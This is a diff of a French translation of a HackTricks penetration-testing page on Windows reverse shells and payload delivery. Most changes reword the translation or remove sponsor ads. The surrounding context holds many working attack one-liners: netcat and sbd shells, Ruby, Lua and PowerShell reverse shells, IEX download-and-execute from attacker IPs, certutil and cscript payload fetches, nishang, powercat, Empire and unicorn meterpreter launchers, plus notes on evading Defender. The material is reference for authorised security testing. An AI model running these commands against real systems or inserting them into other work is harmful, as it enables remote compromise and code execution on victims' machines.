@@ -10,22 +10,14 @@ Autres façons de soutenir HackTricks :
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Lolbas
 
-La page [lolbas-project.github.io](https://lolbas-project.github.io/) est pour Windows ce que [https://gtfobins.github.io/](https://gtfobins.github.io/) est pour Linux.\
-Évidemment, **il n'y a pas de fichiers SUID ni de privilèges sudo dans Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être utilisés de manière abusive pour effectuer des actions inattendues telles que **exécuter du code arbitraire.**
+La page [lolbas-project.github.io](https://lolbas-project.github.io/) est pour Windows comme [https://gtfobins.github.io/](https://gtfobins.github.io/) est pour Linux.\
+De toute évidence, **il n'y a pas de fichiers SUID ou de privilèges sudo dans Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être (mal) utilisés pour effectuer des actions inattendues telles que **exécuter du code arbitraire.**
 
 ## NC
 ```bash
@@ -33,7 +25,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) est une alternative portable et sécurisée à Netcat**. Il fonctionne sur les systèmes de type Unix et Win32. Avec des fonctionnalités telles qu'un cryptage fort, l'exécution de programmes, des ports source personnalisables et une reconnexion continue, sbd offre une solution polyvalente pour la communication TCP/IP. Pour les utilisateurs de Windows, la version sbd.exe de la distribution Kali Linux peut être utilisée comme un remplacement fiable de Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) est une alternative portable et sécurisée à Netcat**. Il fonctionne sur les systèmes de type Unix et Win32. Avec des fonctionnalités telles que le chiffrement fort, l'exécution de programmes, des ports source personnalisables et une reconnexion continue, sbd offre une solution polyvalente pour la communication TCP/IP. Pour les utilisateurs de Windows, la version sbd.exe de la distribution Kali Linux peut être utilisée comme un remplacement fiable de Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -62,7 +54,7 @@ ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.pope
 ```
 ## Lua
 
-Lua is a powerful, efficient, lightweight, embeddable scripting language. It is often used in the gaming industry for scripting game logic due to its speed and simplicity. Lua scripts can be executed within a Lua interpreter or embedded within other programs written in languages such as C or C++.
+Lua is a powerful, efficient, lightweight, embeddable scripting language. It is often used in the context of game development, but it can also be used for general-purpose scripting. Lua scripts can be executed within a Lua interpreter or embedded into other programs written in languages such as C or C++. Lua scripts can be used to automate tasks, extend the functionality of a program, or even create standalone applications. Lua is known for its simplicity and flexibility, making it a popular choice among developers for various applications.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -90,12 +82,12 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Processus effectuant un appel réseau : **powershell.exe**\
-Charge utile écrite sur le disque : **NON** (_du moins nulle part que j'ai pu trouver en utilisant procmon !_)
+Charge utile écrite sur le disque : **NON** (_du moins nulle part où j'ai pu trouver en utilisant procmon !_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Processus effectuant un appel réseau: **svchost.exe**\
-Charge utile écrite sur le disque: **cache local du client WebDAV**
+Charge utile écrite sur le disque: **Cache local du client WebDAV**
 
 **En une ligne:**
 ```bash
@@ -277,14 +269,6 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 **Détecté par le défenseur**
 
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## **Cscript/Wscript**
 ```bash
 powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
@@ -361,7 +345,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Compiler du code C# sur la machine de la victime.
+Compiler le code C# sur la machine de la victime.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
@@ -395,7 +379,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Dans le dossier **Shells**, il y a beaucoup de shells différents. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier:
+Dans le dossier **Shells**, il y a beaucoup de coquilles différentes. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -405,7 +389,7 @@ powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).
 
-**TODO: Vérifier les autres shells de nishang**
+**TODO: Vérifier les autres shells nishang**
 
 ### **PS-Powercat**
 
@@ -440,7 +424,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Créez un lanceur powershell, enregistrez-le dans un fichier, puis téléchargez-le et exécutez-le.
+Créez un lanceur powershell, enregistrez-le dans un fichier et téléchargez-le pour l'exécuter.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -454,7 +438,7 @@ Créez une version powershell de la porte dérobée metasploit en utilisant unic
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Lancez msfconsole avec la ressource créée :
+Commencez msfconsole avec la ressource créée :
 ```
 msfconsole -r unicorn.rc
 ```
@@ -480,14 +464,6 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS avec quelques modul
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
-
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-
 <details>
 
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
@@ -496,8 +472,8 @@ Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez** 💬 [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
